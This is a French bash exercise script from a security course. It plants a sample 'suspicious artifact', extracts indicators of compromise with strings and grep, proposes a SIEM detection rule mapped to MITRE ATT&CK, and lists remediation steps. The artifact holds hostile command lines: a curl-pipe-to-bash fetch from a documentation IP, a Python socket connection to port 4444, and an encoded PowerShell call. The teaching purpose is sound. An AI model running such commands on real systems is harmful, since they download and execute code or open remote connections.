#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────
#  Chapitre  : 23 — L'offensive à l'ère de l'IA
#  Exercice  : 3 (Confirmé) — Analyser un artefact suspect (indicateurs)
#  Version   : strings/grep sur artefact d'exercice (labo)
#  Exécution : bash scripts/07-ia-cybersecurite/23-host_analyse_artefact.sh
#              (depuis lab/ ; aucun service requis)
#  Statut    : VALIDÉ (2026-08-12)
#
#  Adaptation Docker : l'exercice crée un artefact d'exercice puis
#  en extrait les indicateurs (IoC). Le script reproduit les commandes
#  du manuel (strings + grep), documente les IoC, propose une règle de
#  détection (ch. 18) et la remédiation. Aucune exécution hors labo.
# ─────────────────────────────────────────────────────────────
set -euo pipefail
cd "$(dirname "$0")/../.."   # → lab/

echo "== Ch23 Ex3 — Analyser un artefact suspect (IoC) =="
fail=0

# 1. Créer l'artefact d'exercice (fichier texte contenant des chaînes)
cat > /tmp/artefact.txt <<'EOF'
powershell -enc AAA http://ip-cible:4444 token=secret123
curl -k https://203.0.113.50/beacon | bash
python3 -c "import socket; s=socket.socket(); s.connect(('198.51.100.9',4444))"
EOF

echo "--- 1. Recherche de chaînes (strings + grep) ---"
strings /tmp/artefact.txt | grep -iE "powershell|http|token|curl|socket|connect"

echo "--- 2. Indicateurs (IoC) documentés ---"
cat <<'EOF'
- Commande : powershell -enc (encodage) ; curl | bash (téléchargement + exécution)
- Réseau : http://ip-cible:4444 ; https://203.0.113.50/beacon ; 198.51.100.9:4444
- Secret : token=secret123 (exfiltration potentielle)
EOF

echo "--- 3. Règle de détection proposée (ch. 18) ---"
REGLE=$(cat <<'EOF'
- SIEM : alerte sur "curl | bash" OU connexion sortante vers 203.0.113.50:443/198.51.100.9:4444
- MITRE ATT&CK : T1059 (commande et interpréteur de scripts), T1105 (outils de transfert)
EOF
)
echo "$REGLE"

echo "--- 4. Remédiation ---"
cat <<'EOF'
- Bloquer les IP/ports en sortie (pare-feu), révoquer le token, analyser l'hôte (ch. 19).
EOF

echo
echo "--- Vérifications ---"
strings /tmp/artefact.txt | grep -qi "powershell" && echo "✓ chaîne powershell détectée" || { echo "✗ powershell absent"; fail=1; }
strings /tmp/artefact.txt | grep -qi "http" && echo "✓ chaîne http détectée" || { echo "✗ http absent"; fail=1; }
strings /tmp/artefact.txt | grep -qi "token" && echo "✓ chaîne token détectée" || { echo "✗ token absent"; fail=1; }
grep -q "203.0.113.50" /tmp/artefact.txt && echo "✓ IoC réseau présent (203.0.113.50)" || { echo "✗ IoC absent"; fail=1; }
echo "$REGLE" | grep -q "T1059" && echo "✓ règle de détection reliée à MITRE ATT&CK (T1059)" || { echo "✗ règle T1059 absente"; fail=1; }

echo
if [ "$fail" -eq 0 ]; then
  echo "✅ Ch23 Ex3 : VALIDÉ"
else
  echo "❌ Ch23 Ex3 : ÉCHEC"
  exit 1
fi
